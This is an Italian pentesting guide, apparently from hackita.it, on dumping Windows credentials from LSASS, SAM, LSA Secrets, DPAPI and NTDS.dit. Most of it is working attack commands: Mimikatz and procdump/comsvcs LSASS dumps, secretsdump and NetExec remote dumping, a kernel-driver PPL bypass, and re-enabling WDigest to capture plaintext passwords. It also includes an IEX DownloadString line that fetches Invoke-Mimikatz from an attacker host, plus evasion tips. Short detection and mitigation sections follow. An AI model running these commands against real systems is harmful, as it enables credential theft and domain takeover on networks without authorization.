---
title: 'Credential Dumping su Windows: LSASS, SAM, DPAPI e NTDS.dit'
slug: credential-dumping
description: >-
  Credential dumping su Windows: hash NTLM e ticket Kerberos da LSASS, SAM, LSA
  Secrets, DPAPI e NTDS.dit con Mimikatz, ProcDump e secretsdump su Active
  Directory
image: /credential-dumping-windows-lsass-sam-dpapi.webp
draft: false
date: 2026-07-17T00:00:00.000Z
categories:
  - guides-resources
subcategories:
  - tecniche
tags:
  - credential dumping
  - LSASS
  - Mimikatz
  - SAM
  - DPAPI
  - NTDS.dit
---

# Credential Dumping su Windows: LSASS, SAM, LSA e DPAPI

Il credential dumping è l'estrazione di credenziali — hash NTLM, ticket Kerberos, password in chiaro — dalla memoria di processo (LSASS), dal database locale (SAM), dai segreti LSA o da vault cifrati (DPAPI e Credential Manager). Le credenziali ottenute alimentano [Pass-the-Hash](https://hackita.it/articoli/pass-the-hash/), [lateral movement](https://hackita.it/articoli/lateral-movement/) e DCSync.

***

Secondo il Verizon Data Breach Investigations Report 2025, l’abuso di credenziali compromesse ha rappresentato il 22% dei vettori di accesso iniziale nelle violazioni analizzate. Dopo la compromissione di un sistema, il credential dumping consente agli attaccanti di estrarre hash, password e altro materiale di autenticazione dalla memoria o dalle strutture del sistema, utilizzandolo successivamente per aumentare i privilegi e muoversi lateralmente nella rete.

Gruppi come Scattered Spider e APT29 sono stati osservati mentre utilizzavano Mimikatz e altre tecniche di credential dumping per raccogliere credenziali dagli ambienti compromessi, spesso nelle prime fasi successive all’accesso iniziale.

>  Windows 11 e Server 2025 con Credential Guard abilitato bloccano la maggior parte delle tecniche di dump da LSASS. In ambienti moderni hardened è necessario ricorrere a metodi alternativi — dump del processo, VSS o tecniche DPAPI.

Classificato da MITRE ATT\&CK come [T1003](https://attack.mitre.org/techniques/T1003/).

***

## Dove Sono le Credenziali su Windows

| Sorgente                   | Contiene                                                    | Strumento principale                      |
| -------------------------- | ----------------------------------------------------------- | ----------------------------------------- |
| **LSASS**                  | Hash NTLM, ticket Kerberos, password in chiaro (se WDigest) | Mimikatz `sekurlsa::logonpasswords`       |
| **SAM**                    | Hash account locali (Administrator, Guest...)               | `lsadump::sam`, secretsdump               |
| **LSA Secrets**            | Service account password, autologon, machine account hash   | `lsadump::secrets`                        |
| **DPAPI**                  | Credenziali browser, vault, certificati, Wi-Fi              | `dpapi::*`, SharpDPAPI                    |
| **Credential Manager**     | Credenziali salvate manualmente da utenti                   | `vault::cred`, cmdkey                     |
| **NTDS.dit**               | Hash di TUTTI gli utenti del dominio (solo su DC)           | DCSync, secretsdump `-just-dc`            |
| **File di configurazione** | Password in chiaro (Unattend.xml, web.config, .ps1)         | `dir /s /b *.xml`                         |
| **Browser**                | Login salvati (Chrome, Edge, Firefox)                       | SharpChrome, LaZagne                      |
| **Registro**               | Autologon, key VPN, credenziali app legacy                  | `reg query HKLM /f password /t REG_SZ /s` |

***

## Quale Tecnica Usare — Flusso Decisionale

```
Hai local admin sulla macchina?
├── SÌ → LSASS dump (hash NTLM di tutti gli utenti loggati)
│         ├── AV bloccante? → ProcDump o comsvcs.dll MiniDump
│         └── PPL attivo? → nanodump o driver kernel
│
├── SEI SU UN DC?
│   ├── SÌ → DCSync (impacket-secretsdump -just-dc) → tutti gli hash del dominio
│   └── In alternativa → NTDS.dit via ntdsutil o VSS
│
├── CERCHI SERVICE ACCOUNT?
│   └── LSA Secrets (lsadump::secrets) → password dei servizi Windows
│
├── CERCHI CREDENZIALI BROWSER?
│   └── DPAPI + SharpChrome/LaZagne
│
└── NON HAI ADMIN?
    └── Cerca file di configurazione, variabili d'ambiente, script PS1
```

***

LSASS è il processo Windows che gestisce autenticazione, policy di sicurezza e ticket Kerberos. Contiene credenziali di tutti gli utenti con sessione attiva sulla macchina — su un DC, questo include credenziali di tutti gli account di dominio che si sono autenticati recentemente.

### Via Mimikatz (metodo classico)

```powershell
# Richiede SeDebugPrivilege — disponibile per local admin
privilege::debug

# Dump completo — plaintext password (se WDigest attivo) + NTLM hash + ticket Kerberos
sekurlsa::logonpasswords

# Solo hash NTLM (più silenzioso)
sekurlsa::msv

# Ticket Kerberos in memoria
sekurlsa::tickets /export

# Kerberos encryption keys (AES + RC4)
sekurlsa::ekeys

# In-memory via PowerShell (niente file su disco)
IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords"'
```

### Via ProcDump (LOLBin Microsoft firmato)

```powershell
# Crea dump del processo LSASS — poi si analizza offline con Mimikatz
.\procdump.exe -accepteula -ma lsass.exe lsass.dmp

# Via Task Manager (GUI) — tasto destro su lsass.exe > Create Dump File
```

```bash
# Analisi offline del dump da Linux con pypykatz
pip install pypykatz
pypykatz lsa minidump lsass.dmp
```

### Via comsvcs.dll (LOLBin nativo Windows)

```powershell
# Nessun tool esterno — usa una DLL di Windows già presente
$lsassPID = (Get-Process -Name lsass).Id
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsassPID C:\temp\lsass.dmp full

# In un'unica riga (più comune in script)
rundll32 C:\Windows\System32\comsvcs.dll MiniDump (Get-Process lsass).id C:\temp\lsass.dmp full
```

### LSA Protection (PPL) — Se Mimikatz Fallisce

```
ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)
```

Questo errore indica che LSASS è protetto da **Protected Process Light (PPL)**. In ambienti con PPL attivo (`HKLM\SYSTEM\CurrentControlSet\Control\Lsa\RunAsPPL = 1`):

```powershell
# Verifica se PPL è attivo
reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL

# Mimikatz con driver kernel (richiede firma del driver o test signing mode)
# Driver: mimidrv.sys
!+
!processprotect /process:lsass.exe /remove
sekurlsa::logonpasswords
!-

# Alternative fileless per PPL bypass (in ambienti reali):
# - SafetyKatz (versione obfuscata)
# - Lsassy (dumping remoto via varie tecniche)
# - nanodump (LSASS dumping stealth)
```

***

## SAM Database — Hash Account Locali

Il database SAM (`C:\Windows\System32\config\SAM`) contiene gli hash NTLM degli account locali. È cifrato con la chiave SYSKEY derivata dall'hive SYSTEM.

```powershell
# Mimikatz — dump SAM in locale
lsadump::sam

# Via registro (richiede SYSTEM o backup privilege)
reg save HKLM\SAM C:\temp\SAM
reg save HKLM\SYSTEM C:\temp\SYSTEM
```

```bash
# Parsing offline da Linux
impacket-secretsdump -sam SAM -system SYSTEM LOCAL

# Remoto via secretsdump (metodo registro remoto)
impacket-secretsdump corp.local/administrator:Password123!@<TARGET_IP>

# Via NetExec
nxc smb <TARGET_IP> -u administrator -p Password123! --sam
```

***

## LSA Secrets — Service Account e Autologon

I segreti LSA (`HKLM\SECURITY`) contengono password di service account, credenziali di autologon, machine account hash e cached domain credentials (DCC2).

```powershell
# Mimikatz
privilege::debug
lsadump::secrets  # LSA secrets
lsadump::cache    # Cached domain credentials (DCC2)
```

```bash
# Via secretsdump (metodo registro remoto)
impacket-secretsdump corp.local/administrator:Password123!@<TARGET_IP>

# Via NetExec
nxc smb <TARGET_IP> -u administrator -p Password123! --lsa
```

Output rilevante:

```
$MACHINE.ACC — hash del computer account (utile per Silver Ticket)
DefaultPassword — password autologon se configurata
DPAPI_SYSTEM — chiavi master DPAPI di sistema
_SC_ServiceName — password di service account configurate come servizi
CORP.LOCAL\utente:$DCC2$... — cached domain credentials
```

***

## DPAPI — Credenziali Cifrate

DPAPI (Data Protection API) cifra credenziali di browser, Credential Manager, certificati e molto altro. Le chiavi master DPAPI si trovano in:

* `%APPDATA%\Microsoft\Protect\<UserSID>\` — utente corrente
* `C:\Windows\System32\Microsoft\Protect\S-1-5-18\` — SYSTEM

```powershell
# Mimikatz — dump master keys DPAPI
privilege::debug
sekurlsa::dpapi

# Decifra blob DPAPI specifico
dpapi::blob /in:encrypted.blob /unprotect

# Credenziali salvate nel Credential Manager
vault::cred /patch

# Browser Chrome (credenziali salvate)
dpapi::chrome /in:"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data"

# Con master key esplicita
dpapi::chrome /in:"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data" /masterkey:<key>
```

Per la guida completa a DPAPI vedi l'articolo dedicato: [DPAPI](https://hackita.it/articoli/dpapi/).

***

## Credential Manager e Windows Vault

```powershell
# Lista credenziali salvate
cmdkey /list

# Mimikatz — dump vault
vault::cred

# Seatbelt — enumera vault e credential files
.\Seatbelt.exe WindowsVault
.\Seatbelt.exe WindowsCredentialFiles

# LaZagne — dump automatico da tutte le sorgenti (browser, mail, WiFi, ecc.)
.\lazagne.exe all
.\lazagne.exe browsers  # solo browser
.\lazagne.exe windows   # solo credential manager e simili
```

***

### ntdsutil — Alternativa a vssadmin per NTDS.dit

```cmd
:: Esegui su DC — genera copia di NTDS.dit + SYSTEM senza vssadmin
ntdsutil "ac i ntds" "ifm" "create full C:\temp\dump" q q

:: Output:
:: C:\temp\dump\Active Directory\ntds.dit
:: C:\temp\dump\registry\SYSTEM
```

```bash
# Analisi offline da Linux
impacket-secretsdump -ntds "C:\temp\dump\Active Directory\ntds.dit" \
  -system "C:\temp\dump\registry\SYSTEM" LOCAL
```

***

## Remote Dumping — Senza Accesso Locale

Se hai credenziali valide ma non hai una shell interattiva sull'host:

```bash
# secretsdump remoto — SAM + LSA + cached creds
impacket-secretsdump corp.local/administrator:Password123!@<TARGET_IP>

# Con Pass-the-Hash
impacket-secretsdump -hashes :NThash corp.local/administrator@<TARGET_IP>

# NetExec — più opzioni e output più leggibile
nxc smb <TARGET_IP> -u administrator -H :NThash --sam
nxc smb <TARGET_IP> -u administrator -H :NThash --lsa
nxc smb <TARGET_IP> -u administrator -H :NThash --ntds  # solo su DC

# Lsassy — dump LSASS remoto con più metodi
lsassy -u administrator -H :NThash <TARGET_IP>
lsassy -u administrator -p Password123! <TARGET_IP> -m procdump  # via procdump
```

Per la guida completa: [secretsdump](https://hackita.it/articoli/secretsdump/).

***

## WDigest e Plaintext Passwords

WDigest è un provider di autenticazione legacy che, se abilitato, mantiene le password in chiaro in memoria LSASS. Disabilitato di default da Windows 8.1/Server 2012 R2 in poi, ma modificabile via registro.

```powershell
# Verifica stato WDigest
reg query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential

# Abilita WDigest (richiede successivo logoff/logon dell'utente target)
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1

# Dopo che l'utente ha effettuato un nuovo logon
sekurlsa::logonpasswords  # ora mostra anche le password in chiaro
```

***

## Credential Harvesting da File

Molto spesso le credenziali sono in chiaro in file di configurazione, script PowerShell, file XML di deployment:

```powershell
# Ricerca ricorsiva di credenziali in file
Get-ChildItem C:\ -Recurse -Include "*.xml","*.txt","*.ini","*.config","*.ps1","*.bat" -ErrorAction SilentlyContinue | 
  Select-String -Pattern "password|passwd|pwd|P@ss|secret|credential|token" -ErrorAction SilentlyContinue |
  Select-Object Path, LineNumber, Line

# File specifici ad alto valore
Get-Content "C:\Windows\Panther\Unattend.xml" 2>$null         # deployment answer file
Get-Content "C:\Windows\Panther\Unattended.xml" 2>$null
Get-Content "C:\Windows\system32\sysprep\sysprep.xml" 2>$null
Get-ChildItem "C:\inetpub\wwwroot" -Recurse -Include "web.config" | Get-Content  # IIS
```

***

## OPSEC

* Mimikatz.exe è flaggato da qualsiasi AV moderno — usa varianti in memoria (Invoke-Mimikatz, SafetyKatz) o caricamento reflective
* `sekurlsa::logonpasswords` è il comando più monitorato — genera Event ID specifici e viene rilevato da EDR con behavioral detection
* `procdump.exe -ma lsass.exe` è firmato Microsoft ma il pattern di accesso a LSASS è comunque rilevabile
* `comsvcs.dll MiniDump` è spesso meno flaggato di procdump ma non invisibile
* Su Windows 11 / Server 2025 con Credential Guard, il dump LSASS non restituisce hash — i tentativi vengono bloccati senza che Mimikatz possa accedere alla memoria protetta

***

## Detection

**🔴 HIGH:**

* **Event ID 10** (Sysmon) — accesso al processo `lsass.exe` da un processo non system/antivirus
* **Event ID 4688** — esecuzione di `mimikatz.exe`, `procdump.exe`, o `rundll32.exe` con argomenti che includono `comsvcs` o `MiniDump`
* Creazione file `.dmp` in percorsi inusuali (C:\temp, %APPDATA%)
* Accesso in lettura alle chiavi `HKLM\SAM` e `HKLM\SECURITY` da processi non-system

**🟡 MEDIUM:**

* `reg save` eseguito su `HKLM\SAM`, `HKLM\SYSTEM`, `HKLM\SECURITY`
* `cmdkey /list` o accesso al Windows Credential Manager fuori dalle finestre amministrative

***

## Mitigazione

* **Credential Guard** (Windows 10/11 Enterprise, Server 2016+) — isola LSASS in un ambiente virtualizzato, impedisce il dump degli hash da memoria
* **LSA Protection (PPL)** — imposta `RunAsPPL=1` per proteggere il processo LSASS
* **Disabilitare WDigest** — assicurarsi che `UseLogonCredential=0` in tutti gli ambienti
* **Abilitare Sysmon** con configurazione che monitora l'accesso a lsass.exe (Event ID 10)
* **Microsoft Defender Credential Guard** — protegge NTLM hash e ticket Kerberos dall'estrazione
* Limitare i permessi di debug (`SeDebugPrivilege`) agli account strettamente necessari

***

## DCSync vs NTDS.dit — Differenza Chiave

Entrambi estraggono gli hash dell'intero dominio, ma con modalità diverse:

|                      | DCSync                                 | NTDS.dit                             |
| -------------------- | -------------------------------------- | ------------------------------------ |
| Come funziona        | Replica AD via protocollo DRSUAPI      | Copia e parsing offline del database |
| Accesso fisico al DC | Non richiesto                          | Richiesto (o VSS remoto)             |
| Artefatti            | Solo log DRSUAPI (Event ID 4662)       | Log vssadmin + file su disco         |
| Velocità             | Veloce (selettivo per utente)          | Lento (intero database)              |
| Stealth              | Più stealth                            | Meno stealth                         |
| Quando usarlo        | Hai credenziali con diritti di replica | DCSync è bloccato o monitorato       |

***

## FAQ

**Credential Guard rende inutile Mimikatz?**
Per il dump LSASS sì — Credential Guard isola gli hash NTLM e i ticket Kerberos in un ambiente virtualizzato (VSM) inaccessibile a Mimikatz. Rimangono accessibili: SAM (hash locali), LSA Secrets, DPAPI (con la chiave giusta), e file di configurazione in chiaro. In ambienti con Credential Guard, il punto di attacco si sposta su DPAPI e file.

**Qual è la differenza tra LSASS e SAM?**
LSASS è un processo che contiene credenziali in memoria — inclusi gli utenti di dominio attualmente loggati. SAM è un file database su disco che contiene solo gli hash degli account locali della macchina. Su una workstation con un utente di dominio loggato, LSASS dà hash di dominio; SAM dà solo gli hash locali.

**Cos'è pypykatz?**
pypykatz è un'implementazione Python di Mimikatz, progettata per analizzare offline dump di memoria LSASS (file .dmp) da Linux. Usala quando hai un dump del processo ma non puoi eseguire Mimikatz Windows: `pypykatz lsa minidump lsass.dmp`.

**Serve essere amministratore per fare credential dumping?**
Per LSASS, SAM e LSA sì — richiedono SeDebugPrivilege o accesso SYSTEM. Per DPAPI con la chiave dell'utente corrente no — ogni utente può decifrare i propri vault DPAPI. Per file di configurazione in chiaro dipende dai permessi del file.

**Qual è la tecnica più usata nei pentest AD?**
DCSync con `impacket-secretsdump -just-dc-user krbtgt` è il target finale quasi sempre. Ma il percorso più frequente in un engagement reale è: LSASS dump sulla prima macchina compromessa → hash del domain admin loggato → PTH verso DC → DCSync.

***

## Conclusione

Il credential dumping è la tecnica che trasforma un accesso locale in movimento laterale — ogni hash raccolto è una potenziale chiave per un altro sistema. La gerarchia è chiara: LSASS per la massima copertura, SAM e LSA per account locali e service account, DPAPI per credenziali cifrate, NTDS.dit per il dominio completo.

La difesa non è semplice perché molte delle tecniche usano API e binary Microsoft legittimi. Credential Guard rimane la protezione più efficace — ma richiede hardware virtualizzato e configurazione esplicita. Senza di essa, qualsiasi local admin su una macchina con sessioni attive ha accesso alle credenziali di tutti gli utenti loggati.

***

**Risorse:**

* [MITRE ATT\&CK – T1003](https://attack.mitre.org/techniques/T1003/)
* [HackTricks – Credential Dumping](https://book.hacktricks.wiki/en/windows-hardening/stealing-credentials/)
